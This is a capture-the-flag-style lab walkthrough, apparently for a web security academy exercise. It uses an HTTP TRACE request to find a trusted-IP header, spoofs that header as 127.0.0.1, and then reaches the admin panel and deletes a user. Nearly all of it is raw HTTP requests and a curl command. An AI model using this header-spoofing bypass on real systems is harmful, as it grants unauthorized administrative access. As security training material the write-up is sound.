# Lab: Authentication bypass via information disclosure

```bash
┌──(kali㉿kali)-[~]
└─$ curl -XTRACE https://ac901f9c1f94fb6ac06b2246000e00b4.web-security-academy.net/my-account?id=administrator
TRACE /my-account?id=administrator HTTP/1.1
Host: ac901f9c1f94fb6ac06b2246000e00b4.web-security-academy.net
User-Agent: curl/7.81.0
Accept: */*
X-Custom-IP-Authorization: 117.194.240.17

```

- The application is blocking `admin` access based on the IP address in `X-Custom-IP-Authorization` header. 
- We can simply bypass it using the localhost address `127.0.0.1`

```
POST /login HTTP/1.1
Host: ac901f9c1f94fb6ac06b2246000e00b4.web-security-academy.net
Cookie: session=S1FykhlMHNG63yKe9VyFtRTRh1AZcEho
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
X-Custom-IP-Authorization: 127.0.0.1
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://ac901f9c1f94fb6ac06b2246000e00b4.web-security-academy.net
Referer: https://ac901f9c1f94fb6ac06b2246000e00b4.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

csrf=b6XF0mg8V0mlwW2dYck0OPuGsZ2StIuZ&username=wiener&password=peter
```

```
GET /my-account HTTP/1.1
Host: ac901f9c1f94fb6ac06b2246000e00b4.web-security-academy.net
Cookie: session=l2XxxpnOCc53h0YMEAvDLBXLkvbqPZzB
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
X-Custom-IP-Authorization: 127.0.0.1
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac901f9c1f94fb6ac06b2246000e00b4.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

```

```
GET /admin HTTP/1.1
Host: ac901f9c1f94fb6ac06b2246000e00b4.web-security-academy.net
Cookie: session=l2XxxpnOCc53h0YMEAvDLBXLkvbqPZzB
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
X-Custom-IP-Authorization: 127.0.0.1
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac901f9c1f94fb6ac06b2246000e00b4.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

```

```
GET /admin/delete?username=carlos HTTP/1.1
Host: ac901f9c1f94fb6ac06b2246000e00b4.web-security-academy.net
Cookie: session=l2XxxpnOCc53h0YMEAvDLBXLkvbqPZzB
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
X-Custom-IP-Authorization: 127.0.0.1
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac901f9c1f94fb6ac06b2246000e00b4.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

```

